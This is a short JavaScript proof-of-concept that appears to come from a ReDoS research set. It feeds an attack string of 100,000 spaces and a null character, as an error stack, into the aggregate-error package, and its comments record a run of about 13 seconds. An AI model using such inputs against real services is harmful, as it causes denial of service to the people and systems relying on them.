import AggregateError from "./v53_aggregate-error_4.0.0_es2015_aggregate-error_ff6bcc1ba33bf3b1810a.js";

//AAttack String :""+" "*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += " ";
}
str += "\u0000";

const error = {
  stack: str,
};

var result = new AggregateError([error]);

// real    0m13.228s
// user    0m13.174s
// sys     0m0.020s

//修改了导入文件的文件名
